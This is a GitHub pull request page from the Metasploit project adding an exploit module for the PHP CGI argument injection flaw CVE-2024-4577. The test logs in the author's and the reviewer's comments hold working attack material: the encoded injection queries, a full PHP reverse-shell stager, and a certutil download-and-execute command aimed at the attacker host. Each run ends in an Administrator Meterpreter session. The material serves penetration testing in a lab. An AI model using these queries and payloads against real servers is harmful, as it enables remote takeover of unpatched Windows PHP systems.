
[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frapid7%2Fmetasploit-framework%2Fpull%2F19247)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frapid7%2Fmetasploit-framework%2Fpull%2F19247)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fpull_requests_fragments%2Fpull_request_layout&source=header-repo&source_repo=rapid7%2Fmetasploit-framework)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[rapid7](/rapid7)
/
**[metasploit-framework](/rapid7/metasploit-framework)**
Public

* [Notifications](/login?return_to=%2Frapid7%2Fmetasploit-framework) You must be signed in to change notification settings
* [Fork
  14.1k](/login?return_to=%2Frapid7%2Fmetasploit-framework)
* [Star
   34.6k](/login?return_to=%2Frapid7%2Fmetasploit-framework)

* [Code](/rapid7/metasploit-framework)
* [Issues
  411](/rapid7/metasploit-framework/issues)
* [Pull requests
  38](/rapid7/metasploit-framework/pulls)
* [Discussions](/rapid7/metasploit-framework/discussions)
* [Actions](/rapid7/metasploit-framework/actions)
* [Projects
  1](/rapid7/metasploit-framework/projects)
* [Wiki](/rapid7/metasploit-framework/wiki)
* [Security](/rapid7/metasploit-framework/security)
* [Insights](/rapid7/metasploit-framework/pulse)

Additional navigation options

* [Code](/rapid7/metasploit-framework)
* [Issues](/rapid7/metasploit-framework/issues)
* [Pull requests](/rapid7/metasploit-framework/pulls)
* [Discussions](/rapid7/metasploit-framework/discussions)
* [Actions](/rapid7/metasploit-framework/actions)
* [Projects](/rapid7/metasploit-framework/projects)
* [Wiki](/rapid7/metasploit-framework/wiki)
* [Security](/rapid7/metasploit-framework/security)
* [Insights](/rapid7/metasploit-framework/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Frapid7%2Fmetasploit-framework%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Frapid7%2Fmetasploit-framework%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# Add exploit module for the new PHP CGI Argument Injection vuln (CVE-2024-4577) #19247

 Merged

[jheysel-r7](/jheysel-r7)
merged 7 commits into
[rapid7:master](/rapid7/metasploit-framework/tree/master "rapid7/metasploit-framework:master")
from
[sfewer-r7:CVE-2024-4577](/sfewer-r7/metasploit-framework/tree/CVE-2024-4577 "sfewer-r7/metasploit-framework:CVE-2024-4577")

Jun 17, 2024

 Merged

# [Add exploit module for the new PHP CGI Argument Injection vuln (CVE-2024-4577)](#top) #19247

[jheysel-r7](/jheysel-r7)
merged 7 commits into
[rapid7:master](/rapid7/metasploit-framework/tree/master "rapid7/metasploit-framework:master")
from
[sfewer-r7:CVE-2024-4577](/sfewer-r7/metasploit-framework/tree/CVE-2024-4577 "sfewer-r7/metasploit-framework:CVE-2024-4577")

Jun 17, 2024

[Conversation
7](/rapid7/metasploit-framework/pull/19247)
[Commits
7](/rapid7/metasploit-framework/pull/19247/commits)
[Checks
37](/rapid7/metasploit-framework/pull/19247/checks)
[Files changed](/rapid7/metasploit-framework/pull/19247/files)

## Conversation

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

[![sfewer-r7](https://avatars.githubusercontent.com/u/122022313?s=60&v=4)](/sfewer-r7)

Copy link

Contributor

### @sfewer-r7 **[sfewer-r7](/sfewer-r7)** commented [Jun 7, 2024](#issue-2340654365)

The (draft) pull request adds an exploit module for the new PHP CGI argument injection vulnerability disclosed yesterday. H/t to Orange Tsai who found the vuln (see [the Devcore disclosure](https://devco.re/blog/2024/06/06/security-alert-cve-2024-4577-php-cgi-argument-injection-vulnerability-en/)), and watchTowr for their [analysis](https://labs.watchtowr.com/no-way-php-strikes-again-cve-2024-4577/).

## To-Do

* More testing on different configurations (I have only tested XAMPP in a Japanese locale)
* Documentation

## Testing

I configured a Windows Server 2022 system with the Japanese locale (Code page 932). As [XAMPP](https://www.apachefriends.org/download.html) is known to be vulnerable in a default configuration, I installed XAMPP `8.2.12 / PHP 8.2.12` ([direct download link here](https://sourceforge.net/projects/xampp/files/XAMPP%20Windows/8.2.12/xampp-windows-x64-8.2.12-0-VS16-installer.exe)).

The exploit supports both PHP payloads (`ARCH_PHP`) and command payloads (`ARCH_CMD`). Note, for testing the `ARCH_CMD` payloads you may need to disable Defender if you are dropping a stock Meterpreter.

## Example: Windows PHP Payload

```
msf6 exploit(windows/http/php_cgi_arg_injection_rce_cve_2024_4577) > show options

Module options (exploit/windows/http/php_cgi_arg_injection_rce_cve_2024_4577):

   Name       Current Setting       Required  Description
   ----       ---------------       --------  -----------
   Proxies                          no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     192.168.86.50         yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80                    yes       The target port (TCP)
   SSL        false                 no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /php-cgi/php-cgi.exe  yes       The path to a PHP CGI endpoint
   VHOST                            no        HTTP server virtual host

Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.86.42    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Windows PHP

View the full module info with the info, or info -d command.

msf6 exploit(windows/http/php_cgi_arg_injection_rce_cve_2024_4577) > check
[+] 192.168.86.50:80 - The target is vulnerable. Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
msf6 exploit(windows/http/php_cgi_arg_injection_rce_cve_2024_4577) > exploit

[*] Started reverse TCP handler on 192.168.86.42:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
[*] Sending stage (39927 bytes) to 192.168.86.50
[*] Meterpreter session 1 opened (192.168.86.42:4444 -> 192.168.86.50:49991) at 2024-06-07 15:31:53 +0100

meterpreter > getuid
Server username: Administrator
meterpreter > pwd
C:\xampp\php
meterpreter > sysinfo
Computer    : WIN-V28QNSO2H05
OS          : Windows NT WIN-V28QNSO2H05 10.0 build 20348 (Windows Server 2022) AMD64
Meterpreter : php/windows
meterpreter >

```
## Example: Windows Command Payload

```
msf6 exploit(windows/http/php_cgi_arg_injection_rce_cve_2024_4577) > show options

Module options (exploit/windows/http/php_cgi_arg_injection_rce_cve_2024_4577):

   Name       Current Setting       Required  Description
   ----       ---------------       --------  -----------
   Proxies                          no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     192.168.86.50         yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80                    yes       The target port (TCP)
   SSL        false                 no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /php-cgi/php-cgi.exe  yes       The path to a PHP CGI endpoint
   VHOST                            no        HTTP server virtual host

Payload options (cmd/windows/http/x64/meterpreter/reverse_tcp):

   Name                Current Setting  Required  Description
   ----                ---------------  --------  -----------
   EXITFUNC            process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   FETCH_COMMAND       CERTUTIL         yes       Command to fetch payload (Accepted: CURL, TFTP, CERTUTIL)
   FETCH_DELETE        false            yes       Attempt to delete the binary after execution
   FETCH_FILENAME      EmrOsqzs         no        Name to use on remote system when storing payload; cannot contain spaces or slashes
   FETCH_SRVHOST                        no        Local IP to use for serving payload
   FETCH_SRVPORT       8080             yes       Local port to use for serving payload
   FETCH_URIPATH                        no        Local URI to use for serving payload
   FETCH_WRITABLE_DIR  %TEMP%           yes       Remote writable dir to store payload; cannot contain spaces.
   LHOST               192.168.86.42    yes       The listen address (an interface may be specified)
   LPORT               4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   1   Windows Command

View the full module info with the info, or info -d command.

msf6 exploit(windows/http/php_cgi_arg_injection_rce_cve_2024_4577) > check
[+] 192.168.86.50:80 - The target is vulnerable. Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
msf6 exploit(windows/http/php_cgi_arg_injection_rce_cve_2024_4577) > exploit

[*] Started reverse TCP handler on 192.168.86.42:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
[*] Sending stage (201798 bytes) to 192.168.86.50
[*] Meterpreter session 2 opened (192.168.86.42:4444 -> 192.168.86.50:49994) at 2024-06-07 15:33:10 +0100

meterpreter > getuid
Server username: WIN-V28QNSO2H05\Administrator
meterpreter > pwd
C:\xampp\php
meterpreter > sysinfo
Computer        : WIN-V28QNSO2H05
OS              : Windows Server 2022 (10.0 Build 20348).
Architecture    : x64
System Language : ja_JP
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x64/windows
meterpreter >

```

Sorry, something went wrong.

 👍
6
 bcoles, remmons-r7, wvu, Chocapikk, jheysel-r7, and senpro-ingwersenk reacted with thumbs up emoji

All reactions

* 👍
  6 reactions

 [sfewer-r7](/sfewer-r7)
added 2 commits
[June 7, 2024 15:43](#commits-pushed-e325d23)

[![@sfewer-r7](https://avatars.githubusercontent.com/u/122022313?s=40&v=4)](/sfewer-r7)

`[first commit for](/rapid7/metasploit-framework/pull/19247/commits/e325d235269682284c7e79d1f59b52854128b51c "first commit for cve-2024-4577") [cve-2024-4577](https://github.com/advisories/GHSA-vxpp-6299-mxw3 "CVE-2024-4577")`

`[e325d23](/rapid7/metasploit-framework/pull/19247/commits/e325d235269682284c7e79d1f59b52854128b51c)`

[![@sfewer-r7](https://avatars.githubusercontent.com/u/122022313?s=40&v=4)](/sfewer-r7)

`[first commit for](/rapid7/metasploit-framework/pull/19247/commits/998724f68309ea11614cc7adcef8d6263761b55a "first commit for cve-2024-4577") [cve-2024-4577](https://github.com/advisories/GHSA-vxpp-6299-mxw3 "CVE-2024-4577")`

`[998724f](/rapid7/metasploit-framework/pull/19247/commits/998724f68309ea11614cc7adcef8d6263761b55a)`

[![@bcoles](https://avatars.githubusercontent.com/u/434827?s=80&u=1fe0601f243e1627c6f738027d2e71b90dad989d&v=4)](/bcoles)

Copy link

Contributor

### **[bcoles](/bcoles)** commented [Jun 7, 2024](#issuecomment-2155027405)

| I haven't had a chance to play around with this bug in a test environment yet. I'm curious if we can use `-s` (`%ADs`) as a simply less-invasive `check`, like the similar 2012 bug?     [metasploit-framework/modules/exploits/multi/http/php\_cgi\_arg\_injection.rb](https://github.com/rapid7/metasploit-framework/blob/9981a24a6c32d318cfed71074e562527b2a100b3/modules/exploits/multi/http/php_cgi_arg_injection.rb#L84)  Line 84 in [9981a24](/rapid7/metasploit-framework/commit/9981a24a6c32d318cfed71074e562527b2a100b3)   |  | response = send\_request\_raw({ 'uri' => "#{uri}?#{create\_arg('-s')}" }) | | --- | --- | |
| --- | --- | --- |

All reactions

Sorry, something went wrong.

[![@sfewer-r7](https://avatars.githubusercontent.com/u/122022313?s=80&u=f52d9d3dd72c1a2c3d8ebb15de11fbea576daa81&v=4)](/sfewer-r7)

Copy link

Contributor

Author

### **[sfewer-r7](/sfewer-r7)** commented [Jun 7, 2024](#issuecomment-2155049200)

| I haven't had a chance to play around with this bug in a test environment yet. I'm curious if we can use `-s` (`%ADs`) as a simply less-invasive `check`, like the similar 2012 bug?  Good idea, I did a quick check against a vulnerable XAMPP server in a Japanese locale, and a non vulnerable XAMPP server in an English locale. Unfortunately, both responses when I just used `-s` (`%ADs`) was the same `500 Internal Server Error` and I could not distinguish the vulnerable server from the non vulnerable server (The body/headers of both responses was the same). |
| --- |

 👍
1
 bcoles reacted with thumbs up emoji

All reactions

* 👍
  1 reaction

Sorry, something went wrong.

[![@rapid7](https://avatars.githubusercontent.com/u/1013671?s=40&v=4)](/rapid7)
[rapid7](/rapid7)
deleted a comment
[Jun 7, 2024](#event-13086257827)

[![@Chocapikk](https://avatars.githubusercontent.com/u/88535377?s=80&u=c07bd7e9964ea27bf395a15ba749e09813f0d4fa&v=4)](/Chocapikk)

Copy link

Contributor

### **[Chocapikk](/Chocapikk)** commented [Jun 9, 2024](#issuecomment-2156496015)

| <https://github.com/xcanwin/CVE-2024-4577-PHP-RCE> |
| --- |

All reactions

Sorry, something went wrong.

 [sfewer-r7](/sfewer-r7)
added 3 commits
[June 10, 2024 17:17](#commits-pushed-3a19a54)

[![@sfewer-r7](https://avatars.githubusercontent.com/u/122022313?s=40&v=4)](/sfewer-r7)

`[remove dead link](/rapid7/metasploit-framework/pull/19247/commits/3a19a54c593878b59c04f832f0be2829ce27153c "remove dead link")`

`[3a19a54](/rapid7/metasploit-framework/pull/19247/commits/3a19a54c593878b59c04f832f0be2829ce27153c)`

[![@sfewer-r7](https://avatars.githubusercontent.com/u/122022313?s=40&v=4)](/sfewer-r7)

`[typo](/rapid7/metasploit-framework/pull/19247/commits/c6de00968f17a58b7ab1e9e82f9b9eb8683e3673 "typo")`

`[c6de009](/rapid7/metasploit-framework/pull/19247/commits/c6de00968f17a58b7ab1e9e82f9b9eb8683e3673)`

[![@sfewer-r7](https://avatars.githubusercontent.com/u/122022313?s=40&v=4)](/sfewer-r7)

`[add documentation](/rapid7/metasploit-framework/pull/19247/commits/bf9b3f1d2a1e3ed62d4897f502b349065a3b6772 "add documentation")`

`[bf9b3f1](/rapid7/metasploit-framework/pull/19247/commits/bf9b3f1d2a1e3ed62d4897f502b349065a3b6772)`

 [![@sfewer-r7](https://avatars.githubusercontent.com/u/122022313?s=40&u=f52d9d3dd72c1a2c3d8ebb15de11fbea576daa81&v=4)](/sfewer-r7)
[sfewer-r7](/sfewer-r7)
marked this pull request as ready for review
[June 10, 2024 16:44](#event-13104641889)

[![@bwatters-r7](https://avatars.githubusercontent.com/u/17987018?s=40&u=562c1b6600d722e45a20f2202dddeb2d6db1f091&v=4)](/bwatters-r7)
[bwatters-r7](/bwatters-r7)
added
[rn-modules](/rapid7/metasploit-framework/labels/rn-modules)
release notes for new or majorly enhanced modules
[module](/rapid7/metasploit-framework/labels/module)
[docs](/rapid7/metasploit-framework/labels/docs)
labels
[Jun 11, 2024](#event-13118970837)

[![@jheysel-r7](https://avatars.githubusercontent.com/u/23320005?s=40&v=4)](/jheysel-r7)
[jheysel-r7](/jheysel-r7)
self-assigned this
[Jun 11, 2024](#event-13123456496)

[![jheysel-r7](https://avatars.githubusercontent.com/u/23320005?s=60&v=4)](/jheysel-r7)

**[jheysel-r7](/jheysel-r7)**
reviewed
[Jun 13, 2024](#pullrequestreview-2111566380)

 [View reviewed changes](/rapid7/metasploit-framework/pull/19247/files/bf9b3f1d2a1e3ed62d4897f502b349065a3b6772)

[documentation/modules/exploit/windows/http/php\_cgi\_arg\_injection\_rce\_cve\_2024\_4577.md](/rapid7/metasploit-framework/pull/19247/files/bf9b3f1d2a1e3ed62d4897f502b349065a3b6772#diff-d65433d43075e25ac743302d9bfceecb2b2aed02490a8dc214b4c5722380ef52)
Outdated

Show resolved

Hide resolved

[modules/exploits/windows/http/php\_cgi\_arg\_injection\_rce\_cve\_2024\_4577.rb](/rapid7/metasploit-framework/pull/19247/files/bf9b3f1d2a1e3ed62d4897f502b349065a3b6772#diff-284850148eada696b808113d19f04df28827b668b51e4650c53ab6d67c3684a3)
Outdated

Show resolved

Hide resolved

 [sfewer-r7](/sfewer-r7)
and others
added 2 commits
[June 13, 2024 15:09](#commits-pushed-d7531ef)

[![@sfewer-r7](https://avatars.githubusercontent.com/u/122022313?s=40&v=4)](/sfewer-r7) [![@jheysel-r7](https://avatars.githubusercontent.com/u/23320005?s=40&v=4)](/jheysel-r7)

`[fix typo in documentation](/rapid7/metasploit-framework/pull/19247/commits/d7531ef74c448c2fe2ce06336c7e4792f2dee4db "fix typo in documentation

Co-authored-by: jheysel-r7 <Jack_Heysel@rapid7.com>")`
 …

`[d7531ef](/rapid7/metasploit-framework/pull/19247/commits/d7531ef74c448c2fe2ce06336c7e4792f2dee4db)`

```
Co-authored-by: jheysel-r7 <Jack_Heysel@rapid7.com>
```

[![@sfewer-r7](https://avatars.githubusercontent.com/u/122022313?s=40&v=4)](/sfewer-r7) [![@jheysel-r7](https://avatars.githubusercontent.com/u/23320005?s=40&v=4)](/jheysel-r7)

`[fix typo in module description](/rapid7/metasploit-framework/pull/19247/commits/fb44c7e6fffa6e7195682da83372326ea96fa013 "fix typo in module description

Co-authored-by: jheysel-r7 <Jack_Heysel@rapid7.com>")`
 …

`[fb44c7e](/rapid7/metasploit-framework/pull/19247/commits/fb44c7e6fffa6e7195682da83372326ea96fa013)`

```
Co-authored-by: jheysel-r7 <Jack_Heysel@rapid7.com>
```

[![@jheysel-r7](https://avatars.githubusercontent.com/u/23320005?s=80&v=4)](/jheysel-r7)

Copy link

Contributor

### **[jheysel-r7](/jheysel-r7)** commented [Jun 17, 2024](#issuecomment-2174050604)

| Thanks for the great module [@sfewer-r7](https://github.com/sfewer-r7)! Testing was as expected on a Windows server 2022 configured with Japanese locale with xampp 8.2.12 installed. TestingWindows PHP ``` msf6 exploit(windows/http/php_cgi_arg_injection_rce_cve_2024_4577) > set rhosts 172.16.199.131 rhosts => 172.16.199.131 msf6 exploit(windows/http/php_cgi_arg_injection_rce_cve_2024_4577) > set verbose true verbose => true msf6 exploit(windows/http/php_cgi_arg_injection_rce_cve_2024_4577) > run  [*] Started reverse TCP handler on 172.16.199.1:4444 [*] Running automatic check ("set AutoCheck false" to disable) [*] PHP content: <?php ; die(); ?> [*] Query: %ADd+disable_functions%3D%22%22+%ADn+%ADd+cgi.redirect_status_env%3D0+%ADd+suhosin.simulation%3D1+%ADd+auto_prepend_file%3Dphp%3A%2F%2Finput+%ADd+cgi.force_redirect%3D0+%ADd+open_basedir%3D [+] The target is vulnerable. Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12 [*] PHP content: <?php /*<?php /**/ error_reporting(0); $ip = '172.16.199.1'; $port = 4444; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();; die(); ?> [*] Query: %ADd+allow_url_include%3D1+%ADd+suhosin.simulation%3D1+%ADd+open_basedir%3D+%ADn+%ADd+disable_functions%3D%22%22+%ADd+cgi.force_redirect%3D0+%ADd+auto_prepend_file%3Dphp%3A%2F%2Finput+%ADd+cgi.redirect_status_env%3D0 [*] Sending stage (39927 bytes) to 172.16.199.131 [*] Meterpreter session 2 opened (172.16.199.1:4444 -> 172.16.199.131:50087) at 2024-06-17 11:10:07 -0700  meterpreter > getuid Server username: Administrator meterpreter > sysinfo Computer    : WIN-KFJKE852RLH OS          : Windows NT WIN-KFJKE852RLH 10.0 build 20348 (Windows Server 2022) AMD64 Meterpreter : php/windows meterpreter >  ``` Windows Command ``` msf6 exploit(windows/http/php_cgi_arg_injection_rce_cve_2024_4577) > set target 1 target => 1 msf6 exploit(windows/http/php_cgi_arg_injection_rce_cve_2024_4577) > set payload cmd/windows/http/x64/meterpreter/reverse_tcp payload => cmd/windows/http/x64/meterpreter/reverse_tcp msf6 exploit(windows/http/php_cgi_arg_injection_rce_cve_2024_4577) > run  [*] Command to run on remote host: certutil -urlcache -f http://172.16.199.1:8080/-LHoYC22ccefBZaLFchCEQ %TEMP%\PfBDecBXKnQW.exe & start /B %TEMP%\PfBDecBXKnQW.exe [*] Fetch handler listening on 172.16.199.1:8080 [*] HTTP server started [*] Adding resource /-LHoYC22ccefBZaLFchCEQ [*] Started reverse TCP handler on 172.16.199.1:4444 [*] Running automatic check ("set AutoCheck false" to disable) [*] PHP content: <?php ; die(); ?> [*] Query: %ADn+%ADd+cgi.redirect_status_env%3D0+%ADd+auto_prepend_file%3Dphp%3A%2F%2Finput+%ADd+open_basedir%3D+%ADd+suhosin.simulation%3D1+%ADd+disable_functions%3D%22%22+%ADd+cgi.force_redirect%3D0 [+] The target is vulnerable. Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12 [*] PHP content: <?php $OAAbJDop = "certutil -urlcache -f http://172.16.199.1:8080/-LHoYC22ccefBZaLFchCEQ %TEMP%\PfBDecBXKnQW.exe & start /B %TEMP%\PfBDecBXKnQW.exe";$OAAbJDop = str_replace('%TEMP%', sys_get_temp_dir(), $OAAbJDop);system($OAAbJDop); die(); ?> [*] Query: %ADd+allow_url_include%3D1+%ADd+cgi.redirect_status_env%3D0+%ADd+disable_functions%3D%22%22+%ADd+open_basedir%3D+%ADn+%ADd+cgi.force_redirect%3D0+%ADd+auto_prepend_file%3Dphp%3A%2F%2Finput+%ADd+suhosin.simulation%3D1 [*] Client 172.16.199.131 requested /-LHoYC22ccefBZaLFchCEQ [*] Sending payload to 172.16.199.131 (Microsoft-CryptoAPI/10.0) [*] Client 172.16.199.131 requested /-LHoYC22ccefBZaLFchCEQ [*] Sending payload to 172.16.199.131 (CertUtil URL Agent) [*] Sending stage (201798 bytes) to 172.16.199.131 [*] Meterpreter session 3 opened (172.16.199.1:4444 -> 172.16.199.131:50091) at 2024-06-17 11:16:01 -0700  meterpreter > getiod [-] Unknown command: getiod. Did you mean getsid? Run the help command for more details. meterpreter > getuid Server username: WIN-KFJKE852RLH\Administrator smeterpreter > sysinfo Computer        : WIN-KFJKE852RLH OS              : Windows Server 2022 (10.0 Build 20348). Architecture    : x64 System Language : ja_JP Domain          : WORKGROUP Logged On Users : 1 Meterpreter     : x64/windows meterpreter >  ``` |
| --- |

 🎉
1
 sfewer-r7 reacted with hooray emoji

All reactions

* 🎉
  1 reaction

Sorry, something went wrong.

 Hide details
View details

[![@jheysel-r7](https://avatars.githubusercontent.com/u/23320005?s=40&v=4)](/jheysel-r7)
[jheysel-r7](/jheysel-r7)
merged commit [`dc70aa0`](/rapid7/metasploit-framework/commit/dc70aa08967f18512bb4d17e6cfd94cadba40b5a)
into
rapid7:master

[Jun 17, 2024](https://github.com/rapid7/metasploit-framework/pull/19247#event-13189908630)
38 of 39 checks passed

[![@jheysel-r7](https://avatars.githubusercontent.com/u/23320005?s=80&v=4)](/jheysel-r7)

Copy link

Contributor

### **[jheysel-r7](/jheysel-r7)** commented [Jun 17, 2024](#issuecomment-2174121562)

| Release Notes Windows systems running Japanese or Chinese (simplified or traditional) locales are vulnerable to a PHP CGI argument injection vulnerability. This exploit module returns a session running in the context of the Administrator user. |
| --- |

All reactions

Sorry, something went wrong.

 [![@sfewer-r7](https://avatars.githubusercontent.com/u/122022313?s=40&u=f52d9d3dd72c1a2c3d8ebb15de11fbea576daa81&v=4)](/sfewer-r7)
[sfewer-r7](/sfewer-r7)
deleted the
CVE-2024-4577

branch
[July 4, 2024 08:59](#event-13391684895)

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Frapid7%2Fmetasploit-framework%2Fpull%2F19247)

Reviewers

[![@jheysel-r7](https://avatars.githubusercontent.com/u/23320005?s=40&v=4)](/jheysel-r7) [jheysel-r7](/jheysel-r7)

jheysel-r7 left review comments

Assignees

[![@jheysel-r7](https://avatars.githubusercontent.com/u/23320005?s=40&v=4)](/jheysel-r7) [jheysel-r7](/jheysel-r7)

Labels

[docs](/rapid7/metasploit-framework/labels/docs)
[module](/rapid7/metasploit-framework/labels/module)
[rn-modules](/rapid7/metasploit-framework/labels/rn-modules)
release notes for new or majorly enhanced modules

Projects

[Metasploit Kanban](/orgs/rapid7/projects/17)

Archived in project

Milestone

No milestone

Development

Successfully merging this pull request may close these issues.

5 participants

[![@sfewer-r7](https://avatars.githubusercontent.com/u/122022313?s=52&v=4)](/sfewer-r7) [![@bcoles](https://avatars.githubusercontent.com/u/434827?s=52&v=4)](/bcoles) [![@Chocapikk](https://avatars.githubusercontent.com/u/88535377?s=52&v=4)](/Chocapikk) [![@jheysel-r7](https://avatars.githubusercontent.com/u/23320005?s=52&v=4)](/jheysel-r7) [![@bwatters-r7](https://avatars.githubusercontent.com/u/17987018?s=52&v=4)](/bwatters-r7)

Add this suggestion to a batch that can be applied as a single commit.
This suggestion is invalid because no changes were made to the code.
Suggestions cannot be applied while the pull request is closed.
Suggestions cannot be applied while viewing a subset of changes.
Only one suggestion per line can be applied in a batch.
Add this suggestion to a batch that can be applied as a single commit.
Applying suggestions on deleted lines is not supported.
You must change the existing code in this line in order to create a valid suggestion.
Outdated suggestions cannot be applied.
This suggestion has been applied or marked resolved.
Suggestions cannot be applied from pending reviews.
Suggestions cannot be applied on multi-line comments.
Suggestions cannot be applied while the pull request is queued to merge.
Suggestion cannot be applied right now. Please check back later.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.

